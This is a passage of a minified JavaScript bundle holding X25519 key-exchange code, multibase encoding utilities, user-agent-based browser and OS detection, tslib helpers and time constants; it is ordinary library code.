[14],b+=n*L,w+=n*D,_+=n*B,E+=n*U,x+=n*$,S+=n*z,A+=n*F,C+=n*H,I+=n*q,k+=n*W,N+=n*V,R+=n*G,T+=n*K,O+=n*Z,P+=n*Y,M+=n*J,n=t[15],w+=n*L,_+=n*D,E+=n*B,x+=n*U,S+=n*$,A+=n*z,C+=n*F,I+=n*H,k+=n*q,N+=n*W,R+=n*V,T+=n*G,O+=n*K,P+=n*Z,M+=n*Y,j+=n*J,o+=38*_,s+=38*E,a+=38*x,c+=38*S,l+=38*A,u+=38*C,h+=38*I,d+=38*k,f+=38*N,p+=38*R,g+=38*T,m+=38*O,v+=38*P,y+=38*M,b+=38*j,i=1,n=o+i+65535,i=Math.floor(n/65536),o=n-65536*i,n=s+i+65535,i=Math.floor(n/65536),s=n-65536*i,n=a+i+65535,i=Math.floor(n/65536),a=n-65536*i,n=c+i+65535,i=Math.floor(n/65536),c=n-65536*i,n=l+i+65535,i=Math.floor(n/65536),l=n-65536*i,n=u+i+65535,i=Math.floor(n/65536),u=n-65536*i,n=h+i+65535,i=Math.floor(n/65536),h=n-65536*i,n=d+i+65535,i=Math.floor(n/65536),d=n-65536*i,n=f+i+65535,i=Math.floor(n/65536),f=n-65536*i,n=p+i+65535,i=Math.floor(n/65536),p=n-65536*i,n=g+i+65535,i=Math.floor(n/65536),g=n-65536*i,n=m+i+65535,i=Math.floor(n/65536),m=n-65536*i,n=v+i+65535,i=Math.floor(n/65536),v=n-65536*i,n=y+i+65535,i=Math.floor(n/65536),y=n-65536*i,n=b+i+65535,i=Math.floor(n/65536),b=n-65536*i,n=w+i+65535,i=Math.floor(n/65536),w=n-65536*i,o+=i-1+37*(i-1),i=1,n=o+i+65535,i=Math.floor(n/65536),o=n-65536*i,n=s+i+65535,i=Math.floor(n/65536),s=n-65536*i,n=a+i+65535,i=Math.floor(n/65536),a=n-65536*i,n=c+i+65535,i=Math.floor(n/65536),c=n-65536*i,n=l+i+65535,i=Math.floor(n/65536),l=n-65536*i,n=u+i+65535,i=Math.floor(n/65536),u=n-65536*i,n=h+i+65535,i=Math.floor(n/65536),h=n-65536*i,n=d+i+65535,i=Math.floor(n/65536),d=n-65536*i,n=f+i+65535,i=Math.floor(n/65536),f=n-65536*i,n=p+i+65535,i=Math.floor(n/65536),p=n-65536*i,n=g+i+65535,i=Math.floor(n/65536),g=n-65536*i,n=m+i+65535,i=Math.floor(n/65536),m=n-65536*i,n=v+i+65535,i=Math.floor(n/65536),v=n-65536*i,n=y+i+65535,i=Math.floor(n/65536),y=n-65536*i,n=b+i+65535,i=Math.floor(n/65536),b=n-65536*i,n=w+i+65535,i=Math.floor(n/65536),w=n-65536*i,o+=i-1+37*(i-1),e[0]=o,e[1]=s,e[2]=a,e[3]=c,e[4]=l,e[5]=u,e[6]=h,e[7]=d,e[8]=f,e[9]=p,e[10]=g,e[11]=m,e[12]=v,e[13]=y,e[14]=b,e[15]=w}function h(e,t){u(e,t,t)}function d(e,t){const r=new Uint8Array(32),i=new Float64Array(80),d=n(),f=n(),p=n(),g=n(),m=n(),v=n();for(let t=0;t<31;t++)r[t]=e[t];r[31]=127&e[31]|64,r[0]&=248,function(e,t){for(let r=0;r<16;r++)e[r]=t[2*r]+(t[2*r+1]<<8);e[15]&=32767}(i,t);for(let e=0;e<16;e++)f[e]=i[e];d[0]=g[0]=1;for(let e=254;e>=0;--e){const t=r[e>>>3]>>>(7&e)&1;a(d,f,t),a(p,g,t),c(m,d,p),l(d,d,p),c(p,f,g),l(f,f,g),h(g,m),h(v,d),u(d,p,d),u(p,f,m),c(m,d,p),l(d,d,p),h(f,d),l(p,g,v),u(d,p,o),c(d,d,g),u(p,p,d),u(d,g,v),u(g,f,i),h(f,m),a(d,f,t),a(p,g,t)}for(let e=0;e<16;e++)i[e+16]=d[e],i[e+32]=p[e],i[e+48]=f[e],i[e+64]=g[e];const y=i.subarray(32),b=i.subarray(16);(function(e,t){const r=n();for(let e=0;e<16;e++)r[e]=t[e];for(let e=253;e>=0;e--)h(r,r),2!==e&&4!==e&&u(r,r,t);for(let t=0;t<16;t++)e[t]=r[t]})(y,y),u(b,b,y);const w=new Uint8Array(32);return function(e,t){const r=n(),i=n();for(let e=0;e<16;e++)i[e]=t[e];s(i),s(i),s(i);for(let e=0;e<2;e++){r[0]=i[0]-65517;for(let e=1;e<15;e++)r[e]=i[e]-65535-(r[e-1]>>16&1),r[e-1]&=65535;r[15]=i[15]-32767-(r[14]>>16&1);const e=r[15]>>16&1;r[14]&=65535,a(i,r,1-e)}for(let t=0;t<16;t++)e[2*t]=255&i[t],e[2*t+1]=i[t]>>8}(w,b),w}function f(e){return d(e,i)}function p(t){if(t.length!==e.SECRET_KEY_LENGTH)throw new Error(`x25519: seed must be ${e.SECRET_KEY_LENGTH} bytes`);const r=new Uint8Array(t);return{publicKey:f(r),secretKey:r}}e.scalarMult=d,e.scalarMultBase=f,e.generateKeyPairFromSeed=p,e.generateKeyPair=function(e){const n=(0,t.randomBytes)(32,e),i=p(n);return(0,r.wipe)(n),i},e.sharedKey=function(t,r,n=!1){if(t.length!==e.PUBLIC_KEY_LENGTH)throw new Error("X25519: incorrect secret key length");if(r.length!==e.PUBLIC_KEY_LENGTH)throw new Error("X25519: incorrect public key length");const i=d(t,r);if(n){let e=0;for(let t=0;t<i.length;t++)e|=i[t];if(0===e)throw new Error("X25519: invalid shared key")}return i}}(H3);var $z=Dz,Lz=$z;const Bz=e=>{if(e instanceof Uint8Array&&"Uint8Array"===e.constructor.name)return e;if(e instanceof ArrayBuffer)return new Uint8Array(e);if(ArrayBuffer.isView(e))return new Uint8Array(e.buffer,e.byteOffset,e.byteLength);throw new Error("Unknown type, must be binary type")},Fz=e=>(new TextEncoder).encode(e),jz=e=>(new TextDecoder).decode(e);class Uz{constructor(e,t,r){this.name=e,this.prefix=t,this.baseEncode=r}encode(e){if(e instanceof Uint8Array)return`${this.prefix}${this.baseEncode(e)}`;throw Error("Unknown type, must be binary type")}}class Wz{constructor(e,t,r){if(this.name=e,this.prefix=t,void 0===t.codePointAt(0))throw new Error("Invalid prefix character");this.prefixCodePoint=t.codePointAt(0),this.baseDecode=r}decode(e){if("string"==typeof e){if(e.codePointAt(0)!==this.prefixCodePoint)throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);return this.baseDecode(e.slice(this.prefix.length))}throw Error("Can only multibase decode strings")}or(e){return F9(this,e)}}class zz{constructor(e){this.decoders=e}or(e){return F9(this,e)}decode(e){const t=e[0],r=this.decoders[t];if(r)return r.decode(e);throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)}}const F9=(e,t)=>new zz({...e.decoders||{[e.prefix]:e},...t.decoders||{[t.prefix]:t}});class Hz{constructor(e,t,r,n){this.name=e,this.prefix=t,this.baseEncode=r,this.baseDecode=n,this.encoder=new Uz(e,t,r),this.decoder=new Wz(e,t,n)}encode(e){return this.encoder.encode(e)}decode(e){return this.decoder.decode(e)}}const Mv=({name:e,prefix:t,encode:r,decode:n})=>new Hz(e,t,r,n),O0=({prefix:e,name:t,alphabet:r})=>{const{encode:n,decode:i}=Lz(r,t);return Mv({prefix:e,name:t,encode:n,decode:e=>Bz(i(e))})},qz=(e,t,r,n)=>{const i={};for(let e=0;e<t.length;++e)i[t[e]]=e;let o=e.length;for(;"="===e[o-1];)--o;const s=new Uint8Array(o*r/8|0);let a=0,c=0,l=0;for(let t=0;t<o;++t){const o=i[e[t]];if(void 0===o)throw new SyntaxError(`Non-${n} character`);c=c<<r|o,a+=r,a>=8&&(a-=8,s[l++]=255&c>>a)}if(a>=r||255&c<<8-a)throw new SyntaxError("Unexpected end of data");return s},Vz=(e,t,r)=>{const n="="===t[t.length-1],i=(1<<r)-1;let o="",s=0,a=0;for(let n=0;n<e.length;++n)for(a=a<<8|e[n],s+=8;s>r;)s-=r,o+=t[i&a>>s];if(s&&(o+=t[i&a<<r-s]),n)for(;o.length*r&7;)o+="=";return o},zn=({name:e,prefix:t,bitsPerChar:r,alphabet:n})=>Mv({prefix:t,name:e,encode:e=>Vz(e,n,r),decode:t=>qz(t,n,r,e)}),Gz=Mv({prefix:"\0",name:"identity",encode:e=>jz(e),decode:e=>Fz(e)}),Kz=Object.freeze(Object.defineProperty({__proto__:null,identity:Gz},Symbol.toStringTag,{value:"Module"})),Jz=zn({prefix:"0",name:"base2",alphabet:"01",bitsPerChar:1}),Zz=Object.freeze(Object.defineProperty({__proto__:null,base2:Jz},Symbol.toStringTag,{value:"Module"})),Qz=zn({prefix:"7",name:"base8",alphabet:"01234567",bitsPerChar:3}),Yz=Object.freeze(Object.defineProperty({__proto__:null,base8:Qz},Symbol.toStringTag,{value:"Module"})),Xz=O0({prefix:"9",name:"base10",alphabet:"0123456789"}),eH=Object.freeze(Object.defineProperty({__proto__:null,base10:Xz},Symbol.toStringTag,{value:"Module"})),tH=zn({prefix:"f",name:"base16",alphabet:"0123456789abcdef",bitsPerChar:4}),rH=zn({prefix:"F",name:"base16upper",alphabet:"0123456789ABCDEF",bitsPerChar:4}),nH=Object.freeze(Object.defineProperty({__proto__:null,base16:tH,base16upper:rH},Symbol.toStringTag,{value:"Module"})),iH=zn({prefix:"b",name:"base32",alphabet:"abcdefghijklmnopqrstuvwxyz234567",bitsPerChar:5}),sH=zn({prefix:"B",name:"base32upper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",bitsPerChar:5}),oH=zn({prefix:"c",name:"base32pad",alphabet:"abcdefghijklmnopqrstuvwxyz234567=",bitsPerChar:5}),aH=zn({prefix:"C",name:"base32padupper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",bitsPerChar:5}),cH=zn({prefix:"v",name:"base32hex",alphabet:"0123456789abcdefghijklmnopqrstuv",bitsPerChar:5}),lH=zn({prefix:"V",name:"base32hexupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV",bitsPerChar:5}),uH=zn({prefix:"t",name:"base32hexpad",alphabet:"0123456789abcdefghijklmnopqrstuv=",bitsPerChar:5}),fH=zn({prefix:"T",name:"base32hexpadupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV=",bitsPerChar:5}),hH=zn({prefix:"h",name:"base32z",alphabet:"ybndrfg8ejkmcpqxot1uwisza345h769",bitsPerChar:5}),dH=Object.freeze(Object.defineProperty({__proto__:null,base32:iH,base32hex:cH,base32hexpad:uH,base32hexpadupper:fH,base32hexupper:lH,base32pad:oH,base32padupper:aH,base32upper:sH,base32z:hH},Symbol.toStringTag,{value:"Module"})),pH=O0({prefix:"k",name:"base36",alphabet:"0123456789abcdefghijklmnopqrstuvwxyz"}),gH=O0({prefix:"K",name:"base36upper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"}),vH=Object.freeze(Object.defineProperty({__proto__:null,base36:pH,base36upper:gH},Symbol.toStringTag,{value:"Module"})),mH=O0({name:"base58btc",prefix:"z",alphabet:"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"}),bH=O0({name:"base58flickr",prefix:"Z",alphabet:"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"}),wH=Object.freeze(Object.defineProperty({__proto__:null,base58btc:mH,base58flickr:bH},Symbol.toStringTag,{value:"Module"})),yH=zn({prefix:"m",name:"base64",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",bitsPerChar:6}),_H=zn({prefix:"M",name:"base64pad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",bitsPerChar:6}),EH=zn({prefix:"u",name:"base64url",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",bitsPerChar:6}),xH=zn({prefix:"U",name:"base64urlpad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",bitsPerChar:6}),SH=Object.freeze(Object.defineProperty({__proto__:null,base64:yH,base64pad:_H,base64url:EH,base64urlpad:xH},Symbol.toStringTag,{value:"Module"})),j9=Array.from("🚀🪐☄🛰🌌🌑🌒🌓🌔🌕🌖🌗🌘🌍🌏🌎🐉☀💻🖥💾💿😂❤😍🤣😊🙏💕😭😘👍😅👏😁🔥🥰💔💖💙😢🤔😆🙄💪😉☺👌🤗💜😔😎😇🌹🤦🎉💞✌✨🤷😱😌🌸🙌😋💗💚😏💛🙂💓🤩😄😀🖤😃💯🙈👇🎶😒🤭❣😜💋👀😪😑💥🙋😞😩😡🤪👊🥳😥🤤👉💃😳✋😚😝😴🌟😬🙃🍀🌷😻😓⭐✅🥺🌈😈🤘💦✔😣🏃💐☹🎊💘😠☝😕🌺🎂🌻😐🖕💝🙊😹🗣💫💀👑🎵🤞😛🔴😤🌼😫⚽🤙☕🏆🤫👈😮🙆🍻🍃🐶💁😲🌿🧡🎁⚡🌞🎈❌✊👋😰🤨😶🤝🚶💰🍓💢🤟🙁🚨💨🤬✈🎀🍺🤓😙💟🌱😖👶🥴▶➡❓💎💸⬇😨🌚🦋😷🕺⚠🙅😟😵👎🤲🤠🤧📌🔵💅🧐🐾🍒😗🤑🌊🤯🐷☎💧😯💆👆🎤🙇🍑❄🌴💣🐸💌📍🥀🤢👅💡💩👐📸👻🤐🤮🎼🥵🚩🍎🍊👼💍📣🥂"),CH=j9.reduce(((e,t,r)=>(e[r]=t,e)),[]),AH=j9.reduce(((e,t,r)=>(e[t.codePointAt(0)]=r,e)),[]);function IH(e){return e.reduce(((e,t)=>e+=CH[t]),"")}function RH(e){const t=[];for(const r of e){const e=AH[r.codePointAt(0)];if(void 0===e)throw new Error(`Non-base256emoji character: ${r}`);t.push(e)}return new Uint8Array(t)}const TH=Mv({prefix:"🚀",name:"base256emoji",encode:IH,decode:RH}),NH=Object.freeze(Object.defineProperty({__proto__:null,base256emoji:TH},Symbol.toStringTag,{value:"Module"}));new TextEncoder,new TextDecoder;const EE={...Kz,...Zz,...Yz,...eH,...nH,...dH,...vH,...wH,...SH,...NH};function U9(e,t,r,n){return{name:e,prefix:t,encoder:{name:e,prefix:t,encode:r},decoder:{decode:n}}}const xE=U9("utf8","u",(e=>"u"+new TextDecoder("utf8").decode(e)),(e=>(new TextEncoder).encode(e.substring(1)))),_w=U9("ascii","a",(e=>{let t="a";for(let r=0;r<e.length;r++)t+=String.fromCharCode(e[r]);return t}),(e=>{const t=B9((e=e.substring(1)).length);for(let r=0;r<e.length;r++)t[r]=e.charCodeAt(r);return t})),W9={utf8:xE,"utf-8":xE,hex:EE.base16,latin1:_w,ascii:_w,binary:_w,...EE};function Ui(e,t="utf8"){const r=W9[t];if(!r)throw new Error(`Unsupported encoding "${t}"`);return"utf8"!==t&&"utf-8"!==t||null==globalThis.Buffer||null==globalThis.Buffer.from?r.decoder.decode(`${r.prefix}${e}`):q3(globalThis.Buffer.from(e,"utf-8"))}function xi(e,t="utf8"){const r=W9[t];if(!r)throw new Error(`Unsupported encoding "${t}"`);return"utf8"!==t&&"utf-8"!==t||null==globalThis.Buffer||null==globalThis.Buffer.from?r.encoder.encode(e).substring(1):globalThis.Buffer.from(e.buffer,e.byteOffset,e.byteLength).toString("utf8")}var SE=globalThis&&globalThis.__spreadArray||function(e,t,r){if(r||2===arguments.length)for(var n,i=0,o=t.length;i<o;i++)(n||!(i in t))&&(n||(n=Array.prototype.slice.call(t,0,i)),n[i]=t[i]);return e.concat(n||Array.prototype.slice.call(t))},OH=function(e,t,r){this.name=e,this.version=t,this.os=r,this.type="browser"},PH=function(e){this.version=e,this.type="node",this.name="node",this.os=process.platform},MH=function(e,t,r,n){this.name=e,this.version=t,this.os=r,this.bot=n,this.type="bot-device"},kH=function(){this.type="bot",this.bot=!0,this.name="bot",this.version=null,this.os=null},DH=function(){this.type="react-native",this.name="react-native",this.version=null,this.os=null},$H=/alexa|bot|crawl(er|ing)|facebookexternalhit|feedburner|google web preview|nagios|postrank|pingdom|slurp|spider|yahoo!|yandex/,LH=/(nuhk|curl|Googlebot|Yammybot|Openbot|Slurp|MSNBot|Ask\ Jeeves\/Teoma|ia_archiver)/,CE=3,BH=[["aol",/AOLShield\/([0-9\._]+)/],["edge",/Edge\/([0-9\._]+)/],["edge-ios",/EdgiOS\/([0-9\._]+)/],["yandexbrowser",/YaBrowser\/([0-9\._]+)/],["kakaotalk",/KAKAOTALK\s([0-9\.]+)/],["samsung",/SamsungBrowser\/([0-9\.]+)/],["silk",/\bSilk\/([0-9._-]+)\b/],["miui",/MiuiBrowser\/([0-9\.]+)$/],["beaker",/BeakerBrowser\/([0-9\.]+)/],["edge-chromium",/EdgA?\/([0-9\.]+)/],["chromium-webview",/(?!Chrom.*OPR)wv\).*Chrom(?:e|ium)\/([0-9\.]+)(:?\s|$)/],["chrome",/(?!Chrom.*OPR)Chrom(?:e|ium)\/([0-9\.]+)(:?\s|$)/],["phantomjs",/PhantomJS\/([0-9\.]+)(:?\s|$)/],["crios",/CriOS\/([0-9\.]+)(:?\s|$)/],["firefox",/Firefox\/([0-9\.]+)(?:\s|$)/],["fxios",/FxiOS\/([0-9\.]+)/],["opera-mini",/Opera Mini.*Version\/([0-9\.]+)/],["opera",/Opera\/([0-9\.]+)(?:\s|$)/],["opera",/OPR\/([0-9\.]+)(:?\s|$)/],["pie",/^Microsoft Pocket Internet Explorer\/(\d+\.\d+)$/],["pie",/^Mozilla\/\d\.\d+\s\(compatible;\s(?:MSP?IE|MSInternet Explorer) (\d+\.\d+);.*Windows CE.*\)$/],["netfront",/^Mozilla\/\d\.\d+.*NetFront\/(\d.\d)/],["ie",/Trident\/7\.0.*rv\:([0-9\.]+).*\).*Gecko$/],["ie",/MSIE\s([0-9\.]+);.*Trident\/[4-7].0/],["ie",/MSIE\s(7\.0)/],["bb10",/BB10;\sTouch.*Version\/([0-9\.]+)/],["android",/Android\s([0-9\.]+)/],["ios",/Version\/([0-9\._]+).*Mobile.*Safari.*/],["safari",/Version\/([0-9\._]+).*Safari/],["facebook",/FB[AS]V\/([0-9\.]+)/],["instagram",/Instagram\s([0-9\.]+)/],["ios-webview",/AppleWebKit\/([0-9\.]+).*Mobile/],["ios-webview",/AppleWebKit\/([0-9\.]+).*Gecko\)$/],["curl",/^curl\/([0-9\.]+)$/],["searchbot",$H]],AE=[["iOS",/iP(hone|od|ad)/],["Android OS",/Android/],["BlackBerry OS",/BlackBerry|BB10/],["Windows Mobile",/IEMobile/],["Amazon OS",/Kindle/],["Windows 3.11",/Win16/],["Windows 95",/(Windows 95)|(Win95)|(Windows_95)/],["Windows 98",/(Windows 98)|(Win98)/],["Windows 2000",/(Windows NT 5.0)|(Windows 2000)/],["Windows XP",/(Windows NT 5.1)|(Windows XP)/],["Windows Server 2003",/(Windows NT 5.2)/],["Windows Vista",/(Windows NT 6.0)/],["Windows 7",/(Windows NT 6.1)/],["Windows 8",/(Windows NT 6.2)/],["Windows 8.1",/(Windows NT 6.3)/],["Windows 10",/(Windows NT 10.0)/],["Windows ME",/Windows ME/],["Windows CE",/Windows CE|WinCE|Microsoft Pocket Internet Explorer/],["Open BSD",/OpenBSD/],["Sun OS",/SunOS/],["Chrome OS",/CrOS/],["Linux",/(Linux)|(X11)/],["Mac OS",/(Mac_PowerPC)|(Macintosh)/],["QNX",/QNX/],["BeOS",/BeOS/],["OS/2",/OS\/2/]];function FH(e){return e?IE(e):typeof document>"u"&&typeof navigator<"u"&&"ReactNative"===navigator.product?new DH:typeof navigator<"u"?IE(navigator.userAgent):WH()}function jH(e){return""!==e&&BH.reduce((function(t,r){var n=r[0],i=r[1];if(t)return t;var o=i.exec(e);return!!o&&[n,o]}),!1)}function IE(e){var t=jH(e);if(!t)return null;var r=t[0],n=t[1];if("searchbot"===r)return new kH;var i=n[1]&&n[1].split(".").join("_").split("_").slice(0,3);i?i.length<CE&&(i=SE(SE([],i,!0),zH(CE-i.length),!0)):i=[];var o=i.join("."),s=UH(e),a=LH.exec(e);return a&&a[1]?new MH(r,o,s,a[1]):new OH(r,o,s)}function UH(e){for(var t=0,r=AE.length;t<r;t++){var n=AE[t],i=n[0];if(n[1].exec(e))return i}return null}function WH(){return typeof process<"u"&&process.version?new PH(process.version.slice(1)):null}function zH(e){for(var t=[],r=0;r<e;r++)t.push("0");return t}var rt={},w2=function(e,t){return w2=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var r in t)t.hasOwnProperty(r)&&(e[r]=t[r])},w2(e,t)};
/*! *****************************************************************************
Copyright (c) Microsoft Corporation.

Permission to use, copy, modify, and/or distribute this software for any
purpose with or without fee is hereby granted.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH
REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY
AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT,
INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM
LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR
OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR
PERFORMANCE OF THIS SOFTWARE.
***************************************************************************** */function Ae(e,t){function r(){this.constructor=e}w2(e,t),e.prototype=null===t?Object.create(t):(r.prototype=t.prototype,new r)}var y2=function(){return y2=Object.assign||function(e){for(var t,r=1,n=arguments.length;r<n;r++)for(var i in t=arguments[r])Object.prototype.hasOwnProperty.call(t,i)&&(e[i]=t[i]);return e},y2.apply(this,arguments)};function HH(e,t){var r={};for(var n in e)Object.prototype.hasOwnProperty.call(e,n)&&t.indexOf(n)<0&&(r[n]=e[n]);if(null!=e&&"function"==typeof Object.getOwnPropertySymbols){var i=0;for(n=Object.getOwnPropertySymbols(e);i<n.length;i++)t.indexOf(n[i])<0&&Object.prototype.propertyIsEnumerable.call(e,n[i])&&(r[n[i]]=e[n[i]])}return r}function qH(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s}function VH(e,t){return function(r,n){t(r,n,e)}}function GH(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)}function KH(e,t,r,n){return new(r||(r=Promise))((function(i,o){function s(e){try{c(n.next(e))}catch(e){o(e)}}function a(e){try{c(n.throw(e))}catch(e){o(e)}}function c(e){e.done?i(e.value):function(e){return e instanceof r?e:new r((function(t){t(e)}))}(e.value).then(s,a)}c((n=n.apply(e,t||[])).next())}))}function JH(e,t){var r,n,i,o,s={label:0,sent:function(){if(1&i[0])throw i[1];return i[1]},trys:[],ops:[]};return o={next:a(0),throw:a(1),return:a(2)},"function"==typeof Symbol&&(o[Symbol.iterator]=function(){return this}),o;function a(o){return function(a){return function(o){if(r)throw new TypeError("Generator is already executing.");for(;s;)try{if(r=1,n&&(i=2&o[0]?n.return:o[0]?n.throw||((i=n.return)&&i.call(n),0):n.next)&&!(i=i.call(n,o[1])).done)return i;switch(n=0,i&&(o=[2&o[0],i.value]),o[0]){case 0:case 1:i=o;break;case 4:return s.label++,{value:o[1],done:!1};case 5:s.label++,n=o[1],o=[0];continue;case 7:o=s.ops.pop(),s.trys.pop();continue;default:if(!(i=(i=s.trys).length>0&&i[i.length-1])&&(6===o[0]||2===o[0])){s=0;continue}if(3===o[0]&&(!i||o[1]>i[0]&&o[1]<i[3])){s.label=o[1];break}if(6===o[0]&&s.label<i[1]){s.label=i[1],i=o;break}if(i&&s.label<i[2]){s.label=i[2],s.ops.push(o);break}i[2]&&s.ops.pop(),s.trys.pop();continue}o=t.call(e,s)}catch(e){o=[6,e],n=0}finally{r=i=0}if(5&o[0])throw o[1];return{value:o[0]?o[1]:void 0,done:!0}}([o,a])}}}function ZH(e,t,r,n){void 0===n&&(n=r),e[n]=t[r]}function QH(e,t){for(var r in e)"default"!==r&&!t.hasOwnProperty(r)&&(t[r]=e[r])}function _2(e){var t="function"==typeof Symbol&&Symbol.iterator,r=t&&e[t],n=0;if(r)return r.call(e);if(e&&"number"==typeof e.length)return{next:function(){return e&&n>=e.length&&(e=void 0),{value:e&&e[n++],done:!e}}};throw new TypeError(t?"Object is not iterable.":"Symbol.iterator is not defined.")}function z9(e,t){var r="function"==typeof Symbol&&e[Symbol.iterator];if(!r)return e;var n,i,o=r.call(e),s=[];try{for(;(void 0===t||t-- >0)&&!(n=o.next()).done;)s.push(n.value)}catch(e){i={error:e}}finally{try{n&&!n.done&&(r=o.return)&&r.call(o)}finally{if(i)throw i.error}}return s}function YH(){for(var e=[],t=0;t<arguments.length;t++)e=e.concat(z9(arguments[t]));return e}function XH(){for(var e=0,t=0,r=arguments.length;t<r;t++)e+=arguments[t].length;var n=Array(e),i=0;for(t=0;t<r;t++)for(var o=arguments[t],s=0,a=o.length;s<a;s++,i++)n[i]=o[s];return n}function a0(e){return this instanceof a0?(this.v=e,this):new a0(e)}function eq(e,t,r){if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var n,i=r.apply(e,t||[]),o=[];return n={},s("next"),s("throw"),s("return"),n[Symbol.asyncIterator]=function(){return this},n;function s(e){i[e]&&(n[e]=function(t){return new Promise((function(r,n){o.push([e,t,r,n])>1||a(e,t)}))})}function a(e,t){try{!function(e){e.value instanceof a0?Promise.resolve(e.value.v).then(c,l):u(o[0][2],e)}(i[e](t))}catch(e){u(o[0][3],e)}}function c(e){a("next",e)}function l(e){a("throw",e)}function u(e,t){e(t),o.shift(),o.length&&a(o[0][0],o[0][1])}}function tq(e){var t,r;return t={},n("next"),n("throw",(function(e){throw e})),n("return"),t[Symbol.iterator]=function(){return this},t;function n(n,i){t[n]=e[n]?function(t){return(r=!r)?{value:a0(e[n](t)),done:"return"===n}:i?i(t):t}:i}}function rq(e){if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var t,r=e[Symbol.asyncIterator];return r?r.call(e):(e="function"==typeof _2?_2(e):e[Symbol.iterator](),t={},n("next"),n("throw"),n("return"),t[Symbol.asyncIterator]=function(){return this},t);function n(r){t[r]=e[r]&&function(t){return new Promise((function(n,i){(function(e,t,r,n){Promise.resolve(n).then((function(t){e({value:t,done:r})}),t)})(n,i,(t=e[r](t)).done,t.value)}))}}}function nq(e,t){return Object.defineProperty?Object.defineProperty(e,"raw",{value:t}):e.raw=t,e}function iq(e){if(e&&e.__esModule)return e;var t={};if(null!=e)for(var r in e)Object.hasOwnProperty.call(e,r)&&(t[r]=e[r]);return t.default=e,t}function sq(e){return e&&e.__esModule?e:{default:e}}function oq(e,t){if(!t.has(e))throw new TypeError("attempted to get private field on non-instance");return t.get(e)}function aq(e,t,r){if(!t.has(e))throw new TypeError("attempted to set private field on non-instance");return t.set(e,r),r}const cq=Object.freeze(Object.defineProperty({__proto__:null,get __assign(){return y2},__asyncDelegator:tq,__asyncGenerator:eq,__asyncValues:rq,__await:a0,__awaiter:KH,__classPrivateFieldGet:oq,__classPrivateFieldSet:aq,__createBinding:ZH,__decorate:qH,__exportStar:QH,__extends:Ae,__generator:JH,__importDefault:sq,__importStar:iq,__makeTemplateObject:nq,__metadata:GH,__param:VH,__read:z9,__rest:HH,__spread:YH,__spreadArrays:XH,__values:_2},Symbol.toStringTag,{value:"Module"})),ca=sa(cq);var RE,Ew={},Qh={};function lq(){if(RE)return Qh;return RE=1,Object.defineProperty(Qh,"__esModule",{value:!0}),Qh.delay=void 0,Qh.delay=function(e){return new Promise((t=>{setTimeout((()=>{t(!0)}),e)}))},Qh}var TE,ml={},xw={},bl={};function uq(){return TE||(TE=1,Object.defineProperty(bl,"__esModule",{value:!0}),bl.ONE_THOUSAND=bl.ONE_HUNDRED=void 0,bl.ONE_HUNDRED=100,bl.ONE_THOUSAND=1e3),bl}var NE,OE,PE,ME,Sw={};function fq(){return NE||(NE=1,function(e){Object.defineProperty(e,"__esModule",{value:!0}),e.ONE_YEAR=e.FOUR_WEEKS=e.THREE_WEEKS=e.TWO_WEEKS=e.ONE_WEEK=e.THIRTY_DAYS=e.SEVEN_DAYS=e.FIVE_DAYS=e.THREE_DAYS=e.ONE_DAY=e.TWENTY_FOUR_HOURS=e.TWELVE_HOURS=e.SIX_HOURS=e.THREE_HOURS=e.ONE_HOUR=e.SIXTY_MINUTES=e.THIRTY_MINUTES=e.TEN_MINUTES=e.FIVE_MINUTES=e.ONE_MINUTE=e.SIXTY_SECONDS=e.THIRTY_SECONDS=e.TEN_SECONDS=e.FIVE_SECONDS=e.ONE_SECOND=void 